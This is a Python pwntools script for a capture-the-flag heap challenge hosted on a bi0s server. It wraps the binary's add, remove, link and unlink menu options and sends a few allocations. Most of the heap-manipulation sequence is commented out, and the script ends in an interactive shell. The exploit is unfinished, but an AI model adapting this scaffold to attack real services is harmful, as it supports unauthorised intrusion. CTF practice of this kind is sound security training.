#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfinit

import os
import time
from rootkit import *

# Set up pwntools for the correct architecture
exe  = context.binary = ELF('./chall')

host = args.HOST or 'challenge.bi0s.in'
port = int(args.PORT or 1234)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

def Add(size, data):
    io.sendlineafter("Choice >> ", "1")
    io.sendlineafter("Enter length : ", "%d" % size)
    io.sendlineafter("Enter data : ", data)
    return io.recvline()

def Remove(index, offset=1337):
    io.sendlineafter("Choice >> ", "2")
    io.sendlineafter("Enter index: ", "%d" % index)
    io.sendlineafter("Which one?(1337 for all) ", "%d" % offset)
    return io.recvline()

def Link(to_index, from_index):
    io.sendlineafter("Choice >> ", "3")
    io.sendlineafter("Enter to index: ", "%d" % to_index)
    io.sendlineafter("Enter from index: ", "%d" % from_index)
    return io.recvline()

def Unlink(index, offset, keep='n'):
    io.sendlineafter("Choice >> ", "4")
    io.sendlineafter("Enter index: ", "%d" % index)
    io.sendlineafter("Enter offset: ", "%d" % offset)
    io.sendlineafter("Do you want to keep it (y/n)? ", keep)
    return io.recvline()

Add(0x40, "\x00"*0x40)
Add(0x40, "\x00"*0x40)
Link(0, 1)

# Add(0x40, "\x00")
# Add(0x40, "\x00")
# Link(0, 1)
# Add(0x40, "\x00")
# Link(0, 1)
# Add(0x40, "\x00")
# Link(0, 1)
# Add(0x60, "\x00")
# Link(1, 0)
# Unlink(0, 2, 'n')
# Remove(0, 1)
# Remove(0, 3)
# Remove(0, 1337)

io.interactive()